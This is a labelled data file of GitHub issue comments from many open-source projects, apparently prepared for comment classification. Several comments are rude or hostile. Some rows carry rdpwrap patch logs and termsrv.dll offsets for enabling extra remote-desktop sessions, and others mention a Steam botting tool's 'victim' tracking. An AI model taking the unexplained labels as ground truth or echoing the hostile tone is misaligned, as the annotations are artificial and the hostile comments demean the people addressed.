Sabaki/SabakiHQ/341/368691858,Sabaki/SabakiHQ/341,"Since this discussion went way out of hand and I do not want to discuss it any further, I will lock this issue. ",False,True
homebrew-cask/Homebrew/52035/421684766,homebrew-cask/Homebrew/52035,I cannot reproduce this. Your cache is  and your user is . How are you running Homebrew exactly? ,False,True
bootstrap/twbs/3057/5496845,bootstrap/twbs/3057,"oh zing, this is now on reddit ",False,True
documentation/nextcloud/1142/455544646,documentation/nextcloud/1142,"Not really - I just have proofed that my claims (even if they were not tested) were correct. I actually worked if you wanted that from me. I still have the opinion, that this specific part with the permission is not wrong. it might be something else. Our CoC applies wherever our community interacts with each other - keep that in mind. We don't want to go that way immediately but please be respectful when demanding answers and help. As I feel highly uncomfortable with how this whole thread here went I will unsubscribe now. May somebody else help you. I will invest my time in other parts. And yes also in making the documentation better even if you think that I really don't want to do that. ",False,True
bootstrap/twbs/3057/5139286,bootstrap/twbs/3057,"Looking for a technical solution (""just use semicolons everywhere"") is not going to help with a social problem (reluctance to properly learn JavaScript). ",False,True
i2cdevlib/jrowberg/252/301007232,i2cdevlib/jrowberg/252,"@friend I agree with everything you said ) Only one single thing that I not agree it's of course the programmer/engineer responsable for mantaining and keep its code base working. BUT there is a big BUT here arduino freezes when this problem that I reported here happens. How can I try to fix this problem if arduino freezes? The only possible to me try to fix this would be to change the implementatino of Jeff's code and Wire.h. You can imagine that I am not too inside those 2 libraryes, I am not developing a veeery simple head tracking mechanism while I would also have to deeply study WIRE.H and Jeff's library. I think it's in the community's interest that those people able to do that, if they feel happy about that, that they should help. It's not a reasonable argument that I should try to fix the problem, if the owner of the library is having a difficult time trying to solve this problem, who am I to try to solve it? I know this is how open source works, and I love everything about it. But, IMHO, this is indeed a bug. If the library is told to do something AND it does not, it's a bug. You a library gets responsable to provide you ACCEL/GYRO data and it freezes once in a while, it's not a feature request that this freeze stops happening, it's a bug. Nobody comes to a bugtracker and says ""Please, I love your library but sometimes it freezes, would you mind adding a feature request that, if possible, can you please, please, LITTLE PLEASE, stop your library's code from freezing and crashing?"". As I see it's a bug, plain and simple bug. But I am happy we disagree on that, otherwise this community would never get so big and raise so many important discussions if everybody had the same ideas! \o/ ",False,True
Titan/Marc3842h/145/459101773,Titan/Marc3842h/145,"Please refrain from speaking german in the issues section, as noted in the Code of Conduct file. This issue tracker is public and is supposed to be helpful to future users, which may very well don't speak german. The victim tracking is a scheduled thread run in the background at 15 minutes intervals. It does indeed get started before the Web API key is initialized but that wasn't a problem until now because the scheduler would be usually later called than the main thread would've finished. As your CPU seems to run insanely fast (or you just got a great scheduler, or just plain lucky), I'll post a fix for it in a few minutes. ",False,True
homebrew-cask/Homebrew/52035/421797294,homebrew-cask/Homebrew/52035,Given that  is unmaintained and this isn't reproducible you'll have to figure this out yourself. ,False,True
harvey/tschwecke/9/17473403,harvey/tschwecke/9,Added a reporter to output an HTML report. ,False,True
ansible/ansible/13262/329232861,ansible/ansible/13262,"@friend, to be clear, you are saying use a syntax of a block level loop, but functionally process the loop at the task level? If that's what you're saying, it doesn't remotely solve the problem at hand. The problem raised here is that currently you can loop a task an arbitrary number of times, but you can't loop a group of tasks an arbitrary number of times (the difference between 3 tasks going  and ",False,True
puppeteer-sharp/kblok/736/435938677,puppeteer-sharp/kblok/736,is like  but synchronous ,False,True
core/owncloud/27775/299415319,core/owncloud/27775,Side-note If your system is not a testing system wait for 10.0.1 or 10.0.2 before upgrading. Until then the repositories are probably fixed as well. ,False,True
openvpn-client/dperson/165/445484206,openvpn-client/dperson/165,"The other container doesn't get a network stack of it's own, but uses the one configured by the openvpn-client container. Go ahead and make your own containers that do that, but you'll have to modify all containers that you use to be able to route their traffic to your openvpn container. ",False,True
angular.js/angular/1463/7611796,angular.js/angular/1463,"If you attempt to send {'_id'{'$oid''123'}} as an argument to a resource, the {'$oid''123'} is removed from the http request that is sent. This is a problem, because mongodb uses keys that start with $ as a way to serialize certain objects. As far as I can tell there's no restriction on $ from the strings in a JSON object, so it seems the behavior of parse is wrong. ",False,True
anaconda-issues/ContinuumIO/5353/328546814,anaconda-issues/ContinuumIO/5353,See Issue #1778 for more information on how to fix this.  Closing as duplicate of #1778  Please remember to update to the latest version of Navigator to include the latest fixes. Open a terminal (on Linux or Mac) or the Anaconda Command Prompt (on windows) and type ,False,True
rdpwrap/stascorp/645/459112025,rdpwrap/stascorp/645,"still have not listening.  I am using ditch's ini and dll.  I have rebooted, reinstalled, etc. Loading configuration... Configuration file c\program files\rdp wrapper\rdpwrap.ini Initializing RDP Wrapper... Base addr  0x00007FFC6B180000 SvcMain    termsrv.dll+0x000000000002BFE0 SvcGlobals termsrv.dll+0x000000000002C870 Version    10.0.17763.292 Freezing threads... Patch CEnforcementCoreGetInstanceOfTSLicense Patch CSessionArbitrationHelperIsSingleSessionPerUserEnabled Patch CDefPolicyQuery Hook CSLQueryInitialize Resumimg threads... &lt;&lt;&lt; SvchostPushServiceGlobals &lt;&lt;&lt; ServiceMain SLInit [0x00007FFC6B26CAB4] bServerSku = 1 SLInit [0x00007FFC6B26CAC4] bRemoteConnAllowed = 1 SLInit [0x00007FFC6B26CAD0] bFUSEnabled = 1 SLInit [0x00007FFC6B26CAC0] bAppServerAllowed = 1 SLInit [0x00007FFC6B26CAC8] bMultimonAllowed = 1 SLInit [0x00007FFC6B26CAB8] lMaxUserSessions = 0 SLInit [0x00007FFC6B26CACC] ulMaxDebugSessions = 0 SLInit [0x00007FFC6B26CAB0] bInitialized = 1 &lt;&lt;&lt; CSLQueryInitialize that is the very last entry in the rdpwrap.txt I can't think of anything else to do to get it to listen.  If I have to I guess I can try and get a pro upgrade for cheap somewhere and see if Win10 Pro is easier to get this working. ",False,True
WarBugs/WarEmu/13182/401558318,WarBugs/WarEmu/13182,Expected behavior and actual behavior No option to leave group - stupid crown over my head no option to disband or leave. Steps to reproduce the problem Screenshots/Videos or archive.org evidences  ,False,True
bootstrap/twbs/3057/11097579,bootstrap/twbs/3057,Just want to be part of web history. Haha... Hilarious. ,False,True
SickChill/SickChill/5159/435371397,SickChill/SickChill/5159,"Of course hardware multifactor wont be required, but SSL and authentication by at least having a username and password set will. This will stop from tons of users' installs popping up all over the internet with no password, opening them up to all sort of attacks. ",False,True
bety/PecanProject/568/361321224,bety/PecanProject/568,Testers should  Test any anomalous behavior against the latest released version of BETYdb Make a note here if the anomalous behavior shows up in the upgrade version but not in the latest released version. Make a new issue (if no issue already exists) if the anomalous behavior also shows up in the latest released version.  ,False,True
rdpwrap/stascorp/601/446689379,rdpwrap/stascorp/601,"just a short note  10.0.17763.194 - CU KB4471332 - keeps/lifts the termsrv.dll to its file version 10.0.17763.168. Therefore since .165, .167, .168 use the data-offset, which are the same, we have to add to the rdpwrap.ini dated 2018-10-10 ( last.ini in the repository - code res\rdpwrap,ini). Ensure you have the correct ini file with two ini-sections [10.0.17763.1] , [10.0.17763.1-SLInit] and add then the two sections [10.0.17763.168], [17763.168-SLInit] ---------------read more in #611 -------------------------------- ",False,True
rdpwrap/stascorp/601/440672264,rdpwrap/stascorp/601,"Just for all users a short remark   Thanks to @friend Something has changed from 17763.1 (incl .55, .107 and .134) to 17763.165 in the x64-data [10.0.17763.165] // LocalOnlyOffset.x64=xxxxx // xxxxx.(17763.1) =77941 ♢ xxxxx.(17763.165) =77AF1 ( tested and validated) all other x64-ini-data for 1809rs517763.1 to .134 are the same as .165-data hint SingleUserOffset.x64=132F9 may be also ==1322C as in the original-ini from 2018-10-10 x86 data not yet fully tested if identical with the base data 17763.1 ( suppose NO!) ",False,True
openDCIM/samilliken/1114/450204022,openDCIM/samilliken/1114,"It really isn't used.  I use (|(userprincipalname=%userid%)(cn=%userid%)) as my base search and i'm matching on the princpalname in my search string.  You just need to use a better search string. ♠$found_dn=@$ldapResults[0]['cn'][0];               $ldapSearchDN=str_replace(""%userid%"",$found_dn,html_entity_decode($config-&gt;ParameterArray['LDAPBaseSearch']));` ",False,True
Semantic-UI-React/Semantic-Org/2550/392205508,Semantic-UI-React/Semantic-Org/2550,@friend Please take a look at the VERY first thing at the top of the README.md ,False,True
bootstrap/twbs/3057/5150869,bootstrap/twbs/3057,@friend Some people take the way of the least resistance ( click Merge button ) and some stand for there beliefs @friend. I like people that stand for there beliefs. (And fyi @friend changed the code 2 days ago to a way that that doesn't fail in jsmin - the discussion is more general about ;+ oder ;- ) ,False,True
bootstrap/twbs/3057/5139755,bootstrap/twbs/3057,"Regardless of whether semicolons are best practice or not, the fact jsmin is breaking existing, functional non-minified code is a flaw. ",False,True
angular.js/angular/1463/41740405,angular.js/angular/1463,  ,False,True
Titan/Marc3842h/145/459099109,Titan/Marc3842h/145,"213325 [Main] INFORMATION Quartz.NET Scheduler - Quartz scheduler version 3.0.4.0 213325 [Main] INFORMATION Quartz.NET Scheduler - Scheduler DefaultQuartzScheduler_$_NON_CLUSTERED started. 213326 [Main] INFORMATION Titan - No valid verb has been provided while parsing. Opening UI... 213326 [Main] DEBUG AccountManager - Titan Account Manager initialized on ""2133"". (1548880406) 213326 [Main] DEBUG Quartz.NET Scheduler - Producing instance of Job 'Titan.Victim Tracker Job', class=Titan.Logging.VictimTracker 213326 [Main] DEBUG Quartz.NET Scheduler - Calling Execute on job Titan.Victim Tracker Job 213326 [null] DEBUG VictimTracker - Checking all victims if they have bans on record. 213326 [null] INFORMATION VictimTracker - Victims [""Titan.Json.Victims+Victim"", ""Titan.Json.Victims+Victim"", ""Titan.Json.Victims+Victim""] 213326 [Main] WARNING SWAHandle - No valid Web API key has been found. Skipping ban checking... 213326 [Main] WARNING SWAHandle - No valid Web API key has been found. Skipping ban checking... 213326 [Main] WARNING SWAHandle - No valid Web API key has been found. Skipping ban checking... 213326 [Main] DEBUG Quartz.NET Scheduler - Trigger instruction  NoInstruction&gt; dann loggt er die accs 213326 [Main] DEBUG AccountManager - Index 0 has expired. It is now available for botting. 213326 [Main] DEBUG AccountManager - Using index #0 for botting. 213326 [Main] DEBUG SWAHandle - Received key from ""steamapi.key"" file ""XXXXXXXXXXXXXXXXXXXXXX"" 213327 [Main] INFORMATION SWAHandle - Steam Web API is valid and will be used. 213327 [Main] INFORMATION Titan - Hello and welcome to Titan ""v1.6.1"".&gt; ein eingetragenener acc in der victims.json hat nen gameban aber ich krieg kein popup oder ieine msg ( und warum sagt er mir erst 3x, dass der key nicht gütlig ist (hab 3 accs in der victims.json eingetragen), dann nimmt er ihn aber später an ",False,True
ansible/ansible/13262/118433547,ansible/ansible/13262,"Issue Type Feature Idea Ansible Version Ansible 2.0.0_rc-1 Ansible Configuration NA Environment Ubuntu 15.10 Summary There are a number of use-cases where it would be valuable to be able to loop over a block of tasks, such that a few tasks are done in order, and that specific block of tasks are looped over for some set of values. It seems that the new block functionality could lend itself well to this if you were to enable looping over blocks. Steps To Reproduce Expected Results Actual Results ",False,True
coffeescript/jashkenas/4056/127769698,coffeescript/jashkenas/4056,I am afraid it won't do the trick.  file still gets respected. Tested with npm install jashkenas/coffeescript#master npm install jashkenas/coffeescript#2d1a6fa6ec76b4e721da7e5e4a9c6b90172309ae ,False,True
core/owncloud/26374/253997290,core/owncloud/26374,"Thanks RealRancor for the usual reply where you never... I have become used to it by now.. All my posts are real info. If it is not real enough for you then don't reply... Sorry Im not a master at programing like you.  If anyone if offended by my comment on nextcloud and saying that ""they don't want such user"" is real crazy; I comment what I want. I have given a huge amount of technical infos and it is not the first time I get file locked on webdav. I had that with oc 8.xx and now 9.xx and the net has plenty of example like mine so if there is no fix for that or method to diagnose then I can't rely on oc...  So now do you have the slightest clue to point me in the right direction ? If you don't then ask for the specific info you need. That is a CONSTRUCTIVE attitude. If you don't know just let me be but policing like you do is just being a jerk. ",False,True
HandBrake/HandBrake/1584/423746463,HandBrake/HandBrake/1584,"I'm not saying your UI is bad, or that you haven't been improving it, or that people can't get things done or figure out what to do. I'm just saying I think it can be changed so people need to click fewer times and look fewer places to get things done. What makes you certain that any additional changes are necessarily bad? Please try to look at it objectively and not as an attack on anybody or any work that's been done. As for the dimensions overhaul, I've already done it. And anyway that particular UI is not something that's hard to do with the proposed UI. It's just contained in the encoding settings window.  Which, by the way 1) Opens not as a dialog but as a helper window. So it does not force the user to close it to interact with anything else in the UI. 2) Is brought into view any time the user is working with any window in the app. 3) Opens beside the main window if the user has space. 4) Remembers its open state and position. So all that that sizing and filters UI is just as readily accessible as before. Why do you think the sizing or filters changes are not possible with this proposal? I'm just asking you to seriously consider an alternate. How it it solving ""different"" concerns? What concern do you think I am addressing, exactly, and why is that concern invalid? Where did this deep conviction come from that there are two fundamentally different user bases, and that the same UI can't possibly serve both of them? ",False,True
Kosmos/AtlasNX/187/465097231,Kosmos/AtlasNX/187,"A Konami code or a file flag would be fine with me too (including disclaimer) Users should just not be exposed to it out of the box (minus dl page), I mean you can literally call it ""Piracy On/off"" else. @friend That is acceptable for me. 👍 ",False,True
composer/composer/7764/435014053,composer/composer/7764,Same with ,False,True
puppeteer-sharp/kblok/736/442239038,puppeteer-sharp/kblok/736,Agreed @friend. I'm also working on a better connection transport for AspNet Full Framework. As it's not recommended to use  there. ,False,True
documentation/nextcloud/1142/455089623,documentation/nextcloud/1142,In my case it's a Debian and an Ubuntu 16.04 and both work totally fine ,False,True
ansible/ansible/13262/204789364,ansible/ansible/13262,includes are very slow! plus one ,False,True
redmine_didyoumean/abahgat/15/5208921,redmine_didyoumean/abahgat/15,Thanks! ,False,True
bootstrap/twbs/3057/5136362,bootstrap/twbs/3057,"i have learned to use them, that's why there isn't one present. ",False,True
AKS/Azure/287/434866830,AKS/Azure/287,@friend Currently we are focused on fixing any existing issues and keep the QoS high before we roll out new features ... ,False,True
btrfs/maharmstone/88/440798437,btrfs/maharmstone/88,"Windows 10 supports Btrfs out of the box, just in case ",False,True
playpen/thestinger/20/23311228,playpen/thestinger/20,"Also, no more dependency on python to generate the system call list because libseccomp added it to the API. ",False,True
moby/moby/4717/29568300,moby/moby/4717,"When launching a dockerised  process as root it is possible to execute some kind of init script to set sysctl values. But setting right ulimits is actually need  the -privileged flag. When run as user (-u flag) is there a way to do subj? I did not find any in docs. Setting of any other stuff (like /dev/shm size,  would be great. ",False,True
ARKStatsExtractor/cadon/850/446818991,ARKStatsExtractor/cadon/850,Yep both the Tek Raptor and Tek Rex are the only two Dino's I can find that have this issue. ,False,True
i2cdevlib/jrowberg/252/300899828,i2cdevlib/jrowberg/252,"@friend  would you mind telling where did you by you MPU6050? Mine I bought from a good reputation store that is a college for studants learning arduino. I think you are correct, there is some sort of problem with the chip itself that causes this problem BUT the Wire library should be able to handle this right, I think the problem is with WIRE and MPU6050 library, none of them are knowing how to handle some unexpected behaviour (or now ""expected behaviour"" as many reported it) with the chip. Sometimes one of the communication lines dont go back to HIGH or something like that... JEFF'S library and WIRE.H library should know bettter how to handle intermitent connection problems, maybe using timeouts. ",False,True
NanoCore/NanoAdblocker/87/356479301,NanoCore/NanoAdblocker/87,"If you need a night mode or any other mode, use browser profile.  For trouble shooting, use the Logger. ",False,True
bootstrap/twbs/3057/5140376,bootstrap/twbs/3057,@friend Yep. ,False,True
ansible/ansible/13262/327869796,ansible/ansible/13262,Yes that's the comment I'm referring to. ,False,True
lxqt/lxqt/1628/441263141,lxqt/lxqt/1628,Probably most distributions ship default configs. And the ones that change things used to patch the default configs for years and it was no problem. Personally I still prefer this approach to having configs in /usr/share. One could argue that having to patch them is even good since it could be that the patch doesn't apply anymore because of new options and so the maintainer gets aware of this and adjusts the file. If he still ships the distro specific thing without checking it could mean that some important things are left out or not udpated. I agree that we should decide on some things and let them stay the way they are for a longer period of time. Recently we had in every release big changes I think (seperate language package..) ,False,True
GoMint/GoMint/406/441236333,GoMint/GoMint/406,"I just want enter and tha da """,False,True
nokogiri/sparklemotion/1709/286791320,nokogiri/sparklemotion/1709,If you're having trouble installing Nokogiri ... Have you tried following [the installation tutorial][tutorial]? yes What is the output of ? What are the contents of the  file? Didnt get so far What operating system are you using? Windows 10 x64 ,False,True
BAR/aowen87/244/336518105,BAR/aowen87/244,"With QT-5 enabled trunk, If I click on 'Operators' or 'Add', then click anywhere else in the gui, those buttons maintain an 'active' or 'pressed' look. If I mouse-over the buttons, they go back to normal appearance.  This is with the default appearance settings on linux. -----------------------REDMINE MIGRATION----------------------- This ticket was migrated from Redmine. The following information could not be accurately captured in the new ticket Original author Kathleen Biagas Original creation 01/06/2016 0649 pm Original update 03/01/2016 0523 pm Ticket number 2497 ",False,True
jeancflanagan/opattison/15/16926560,jeancflanagan/opattison/15,"Make sure it's reusable elsewhere in case it is appropriate for pages that aren't strictly articles. @friend why don't you take a shot at writing the HTML in a separate file in the _includes folder (call it ""twitter-comment.html"" or something) in a separate branch? I can help you style it. ",False,True
Kosmos/AtlasNX/187/465272667,Kosmos/AtlasNX/187,@friend Please don't go off-topic in a github issue - Github is not a social hub. ,False,True
jekyll/jekyll/6948/404036986,jekyll/jekyll/6948,"@friend For example, an  could have a ",False,True
java-client/appium/621/294161488,java-client/appium/621,"@friend If you wanna test toast messages, you have to use UIAutomator2 as automationName.It is not possible to test the same feature in legacy driver. If running your tests on UiAutomator2 breaks your tests there is no other go you have to fix it one day or other since legacy drivers will be deprecated sooner or later. ",False,True
jekyll/jekyll/6948/386843679,jekyll/jekyll/6948,"I'd love to see Docker volume mounts work with Docker for Windows. Rails, Flask, Phoenix and Node applications that I've worked with all work fine in Docker for Windows. You volume mount in the code, make a change, and in milliseconds your change is reflected and ready to be seen in a browser. With Jekyll 3.8, this does not happen. The file change is reflected inside of the container, but the  command doesn't regenerate the file. Using  also doesn't work. Everything works fine under WSL but Jekyll is the only reason I have Ruby installed on my machine, mainly because every other app from every other language / framework works wonderfully with Docker. ",False,True
expo/expo/3030/451008568,expo/expo/3030,"@friend Hooks are not stable in React itself yet. Once hooks are released in a stable version of React, then RN will later upgrade React. Once RN stabilizes, we then have a path to bring hooks to Expo. @friend Web is still a ways out and is pre-experimental. When it is ready, we will announce it with the release notes at that time on blog.expo.io. ",False,True
DietPi/Fourdee/1912/405104828,DietPi/Fourdee/1912,More important things to do than troll a troll. ,False,True
certbot/certbot/5433/358436840,certbot/certbot/5433,"This is an error from Unbound, not our own software. The configuration to set up your own instance of Unbound to troubleshoot is there. I also recommended that you move to the community forum if you need help understanding the problems. I'm going to lock this issue now. As previously mentioned this isn't anything the Certbot team can help with, the problem exists in an entirely separate layer of technology than the ACME client you're using. ",False,True
bootstrap/twbs/7482/16072306,bootstrap/twbs/7482,@friend how so? The practice of using multiple headings to indicate subtitles had been no more common that other methods. as defined hgroup promoted this one method. As defined hgroup would have resulted (if the semantics were implemented) in the same outcome for assistive technology users as the small pattern in discussion i.e. the hgroup was defined to be the heading and the semantics of the individual headings removed. ,False,True
ansible/ansible/13262/159036410,ansible/ansible/13262,"@friend I hadn't seen the docs on looping over includes, which seems the better solution than what I have suggested, as my method could quickly result in code that is more difficult to follow. ",False,True
find-and-replace/atom/322/71014797,find-and-replace/atom/322,@friend It would be nice for the few of us (me) that do use that button frequently to at least have the option of having it (i.e. in the settings somewhere) ,False,True
Elgg/Elgg/12126/345173745,Elgg/Elgg/12126,"When upgrading a test installation from beta3 to rc1 I got the pending profile field upgrade. Execution fails with the error Upgrade ""Migrate schema of profile fields"" failed Profile field 'description' could not be migrated An exception occurred while executing ' INSERT INTO elgg_annotations (entity_guid, , , value_type, owner_guid, access_id, time_created, enabled) SELECT entity_guid, ?, , value_type, owner_guid, access_id, time_created, enabled FROM elgg_metadata WHERE  = ? AND entity_guid IN ( SELECT guid FROM elgg_entities WHERE type = 'user' ) ' with params [""profiledescription"", ""description""] SQLSTATE[23000] Integrity constraint violation 1048 Column 'owner_guid' cannot be null ",False,True
NanoCore/NanoAdblocker/87/287260640,NanoCore/NanoAdblocker/87,i think this is the best enhancement ,False,True
cdnjs/cdnjs/13175/449976584,cdnjs/cdnjs/13175,"@friend thanks for reporting, let's move to #13165 or #13166 ",False,True
Telegram/DrKLO/1173/89517134,Telegram/DrKLO/1173," please, help me ) ",False,True
zfs/zfsonlinux/7401/379847890,zfs/zfsonlinux/7401,"On 2018-04-09 1417, Richard Yao wrote ",False,True
bootstrap/twbs/9501/35363247,bootstrap/twbs/9501,plus one to bring it back. but also... plus one to @friend and the core team even if they don't bring it back. ,False,True
moose/idaholab/12263/427953911,moose/idaholab/12263,"FYI. The VPP/PP plotting in Peacock uses matplotlib, not chigger. ",False,True
btrfs/maharmstone/88/440933440,btrfs/maharmstone/88,"It’s an SSD drive which has not otherwise exhibited problems. Normally, I spend all of my time in Linux. However, I was doing some porting work and I was using Windows intensively during a month or two, without booting Linux. I remember receiving BSODs caused by WinBtrfs. I commented on another issue about the BSODs - #87. After I was finished with windows and booted back into Linux, I found the partition completely hosed as described above. Don’t you think that a natural conclusion is that WinBtrfs caused this? ",False,True
zfs/zfsonlinux/7401/379553960,zfs/zfsonlinux/7401,From what we have seen so far it certainly seems to only affect older (by which I mean lower-versioned) kernels. I have not been able to reproduce the issue on Linux 4.15 (Fedora). ,False,True
core/owncloud/27775/301329149,core/owncloud/27775,"@friend As long as the repositories are provided officially by the project, the quality of these repositories is one part of the overall project quality. See my point from above, if you provide such a thing, make sure you know what you are doing, if not, do not setup a repository in the first place. ",False,True
zfs/zfsonlinux/7401/380205514,zfs/zfsonlinux/7401,"@friend We do not have a one liner yet. People are continuing to analyze the issue and we will have a proper fix in the near future. That will include a way to detect+correct the wrong directory sizes, list snapshots affected and place the orphaned files in some kind of lost+found directory. I am leaning toward extending scrub to do it. @friend @friend Here is what I propose. We can extend zpool to handle this by  Providing an errata toggle for ‘zpool scrub‘ that will search the pool for known errata and correct them to the best of its ability. Orphaned files could be placed into a top level dataset lost+found directory. I had considered going with .zfs/lost+found, but .zfs/lost+found would force mv to create a new file rather than a top level lost+found, which would just make a link for the existing one. The former might not be appropriate in all cases (e.g. deduplication on large files, large files on filled pools). We would need to handle collisions inside lost+found and add special handling for if the lost+found directory already exists with the immutable bit, but it seems both doable and the least bad option to me. Of course, we could always do both and have a switch somewhere to toggle it, but I would rather not go overboard by over-engineering a solution to get people’s files back for what I hope to be a one time event. Dumping details of what the special ‘zpool scrub‘ run corrected and what it needs the administrator to correct into ‘zpool status‘. Specifically, it should say what directories had their sizes corrected and which snapshots need to be deleted to purge the issue from the system. Letting ‘zpool clear‘ or a subsequent scrub wipe the information from zpool status.  We can also add a new feature flag that will allow the errata scrub to mark pools as being unimportable on certain versions of certain platforms in the future, so that those versions will fail to import the pools while saying that a later driver marked them as having a known intregrity bug. Then a force import to override it be needed. That way if this should ever happen again in a tagged release, we would not need to abuse feature flags to prevent a repaired pool from ending up imported on a buggy version. This might be more complicated to do in Illumos than in FreeBSD or Linux because Illumos distributions handle versioning, but I expect that it is doable. I still need to flesh out a few details, but that is the general gist of my thinking on how to deal with affected pools. What do you think? ",False,True
code-d/Pure-D/29/193386152,code-d/Pure-D/29,"Basically the issue is right here  but i have no idea how to fix it. Also can somebody on OSX try it out? I just pulled that code out and it works on linux but idk if that will be enough to reproduce the problem. So if somebody on OSX could try the code out, would be nice ",False,True
docxtemplater/open-xml-templating/184/161425897,docxtemplater/open-xml-templating/184,I ended up with this. works perfectly. Awesome module you've made! ,False,True
AKS/Azure/287/409787201,AKS/Azure/287,Cross reference ,False,True
bootstrap/twbs/9501/32690234,bootstrap/twbs/9501,"We've been very vocal about removing or changing things that break backward compatibility (with major releases). We document it in our readme. We tell folks about it in advance of new releases. We also have a pretty good track record of telling folks exactly why we remove things. In this case, I saw no need to implement a vertical divider that  Duplicates the behavior and style of borders between navbar subcomponents (e.g., forms, navs, etc). Was most commonly used to imitate borders on navbar links instead of simply adding s to the navbar anchors.  Moreover, this change happened five months ago. We've kind of passed the time for giving feedback on what makes it into v3, and as I stated above, I have no plans to re-implement this small of a change. I've already commented on the demand aspect. Like other feature requests with dozens of comments (hell, even hundreds of comments at times), if we don't want to add it, we won't. We listen to the needs of the community and try to provide the best solutions whenever possible. However, we also are the ones that maintain this library, and if we don't want to add something as trivial as a divider, we won't. Again, I'm not trying to be an ass about this—it's purely matter of fact. Again, I've very clearly stated why (twice now). Breaking changes from major releases are to be expected. The web moves too fast to lock ourselves into incorrect changes or wrong decisions we made a year earlier. We will continue to break backward compatibility when it suites the wellbeing of the framework. We also do our best to test things out and communicate as clearly as possible what's changed in a release. We callout gotchas, dependency updates, and more as much as possible. We do make mistakes though, and that's why we have bug reports. By that logic we should do anything and everything ever asked of us. And that's a bad argument, and it's something we'll never end up doing. Our goal is to help people build awesome shit on the internet. It's not our job to do every part of your work for you. Our job is to make it easier for you to do your job. Obviously we should make it as easy as possible, but if you're blaming us for you having to add some borders to a framework that provides as much as we do, you might want to rethink your priorities. We don't solve every problem. We solve common problems to the best of our abilities. Fine by me. That's no argument for making this divider come back, but if you feel it's enough to make you choose something else, I won't fight you on it. Thanks for having been a user this long &lt;3. ",False,True
PHPCI/Block8/1234/161755247,PHPCI/Block8/1234,"I have this problem on a virtual-machine running ubuntu server 16.04. Error-Message is♠Warning fsockopen() unable to connect to localhost11300 (Connection refused) in /var/www/phpci/vendor/pda/pheanstalk/src/Socket/StreamFunctions.php line 73` What could i do here? It is a fresh installed Ubuntu Server with Apache, PHP7, Mysql etc. Expected behaviour  I don't know, as i have never reached the next page before. I would say No error -) *  Actual behaviour  Instead i see the message Warning fsockopen() unable to connect to localhost11300*  Steps to reproduce  Install it like described in the guide on a very clean ubuntu server 16.04 virtual machine. i used vbox on windows. add a new github project and click on ""build"". *  Environment info Operating System ubuntu server 16.04  PHP Version 7.0 MySQL Version 5.7.12 Logs or other output that would be helpful Please tell me, which logs you need, and i will upload them. ",False,True
code-d/Pure-D/29/183710598,code-d/Pure-D/29,is another dcd-server already running? ,False,True
puppeteer-sharp/kblok/736/442240114,puppeteer-sharp/kblok/736,"That's great. By the way, thanks for your help on it blush ",False,True
zfs/zfsonlinux/7401/379831142,zfs/zfsonlinux/7401,"For those who need them, here are links to the RPM packages for coreutils on CentOS 6 and CentOS 7  on how to extract them are here  just mentioned in IRC that he tested  from Gentoo, Debian 8 and CentOS 7 on Gentoo Hardened. He was unable to reproduce this with the Gentoo and Debian  binaries, but could with the CentOS 7 one. ",False,True
juice-shop/bkimminich/80/51467422,juice-shop/bkimminich/80," Use some fancy Bootstrap theme Apply some CSS-magic (help needed!) Add some no-op functions that distract the attackers a bit (e.g. pagination, more images, ...)     &lt;bountysource-plugin&gt;   Want to back this issue? Place a bounty on it! We accept bounties via Bountysource. &lt;/bountysource-plugin&gt; ",False,True
zfs/zfsonlinux/7401/379628367,zfs/zfsonlinux/7401,"I can confirm the ENOSPC (No space left on device) is coming from  when we hit the retry limit, running the reproducer under the following stap script ` relevant output ",False,True
rdpwrap/stascorp/645/458678178,rdpwrap/stascorp/645,"Hello. I am simply not able to make it function. I have win 10 pro 17763.292 and everything is green as it should be. I installed the ini file following way. In the install folder i have the ini file prepared before typing rdowinst -i. Everything is acitvated, i checked the ini file in the installation folder, it is the right modified one. When i try to connect it disconnects the local user (lets call him user A) and the screen of the local user changes to the account i have connected to (user B). I dont even get the message that someone will be disconected or that there are too many users. It simply disconnects user A. It would be grateful for any suggestion. ",False,True
eXpand/eXpandFramework/176/425669772,eXpand/eXpandFramework/176,"UpdateOnly would only do a key field match and update the record. If the record is not found, new record is not created. ",False,True
react-helmet/nfl/373/446128006,react-helmet/nfl/373,@friend is right a patch version will be great at least we can publish the changes to our production application without any nasty hacks to fix this issue. ,False,True
eXpand/eXpandFramework/176/427287370,eXpand/eXpandFramework/176,nightly build  ,False,True
flutter_webview_plugin/dart-flitter/60/312526026,flutter_webview_plugin/dart-flitter/60,"Hi, how can I open a file that is locally stored on the device? For example, if the file index.html is located inside my project's assets folder? ",False,True
gate/hunter-packages/2/40306145,gate/hunter-packages/2,HunterGate.cmake doesn't repeat the BSD licence in its preamble.  This means that you lose the licence terms when following the instructions to copy the file to your project.  Could the licence be included inside this file? ,False,True
GoMint/GoMint/406/434017069,GoMint/GoMint/406,Let's implement for have more threads! ,False,True
AKS/Azure/759/391296858,AKS/Azure/759,I am opening this issue as #287 was closed without any updates! Also tracked on ,False,True
find-and-replace/atom/322/70872534,find-and-replace/atom/322,"@friend that's probably a bug in styleguide. Can you open an issue on styleguide? Can you open the keybinding resolver (), use the key command and screenshot it for the new issue? ",False,True
SickChill/SickChill/5159/437541624,SickChill/SickChill/5159,@friend if you think that SC and nzbtomedia and nzbget and sabnzbd do not support https you are mistaken. ALL of the apps including SC have had the support for password logins and SSL/TLS (This just means https instead of http) for YEARS. We simply want to make the settings use the more secure settings that ARE ALREADY THERE in ALL of these apps. Absolutely nothing will break. ,False,True
bootstrap/twbs/3057/10114018,bootstrap/twbs/3057,"I think this is all about @friend trying to be hipster. You know... step over all style guides currently available at the moment. YAY! Personally, I like, and I think the only correct answer is the first @friend comment. There's nothing else to add. ",False,True
vuejs.org/vuejs/974/369056454,vuejs.org/vuejs/974,vuejs will never be WCAG 2.0 complaint because its vue-* attributes do not pass HTML5 validation and you guys denied to fix that ,False,True
bootstrap/twbs/3057/5147859,bootstrap/twbs/3057,LOL -- This has made me giggle ) Use Dart if you dont like JS P Google wont complain....... ,False,True
puppeteer-sharp/kblok/736/435943106,puppeteer-sharp/kblok/736,"I'm not sure about that, the Task is the responsable to get the message, besides, i already did it once, and even got the anwser, but now, i migrated to my main testbench and it blew up, and I can't even access the other IIS anymore, it doesnt allow me xD I can't do full  because most of my program doesn't support it ",False,True
hoverfly/SpectoLabs/821/474695225,hoverfly/SpectoLabs/821,Please help us. It's very urgent for us ,False,True
ansible/ansible/14050/238216536,ansible/ansible/14050,"@friend I hope people will not take you comments personal and instead will what it really matters. I do sustain your points, less the way of putting it ;) ",False,True
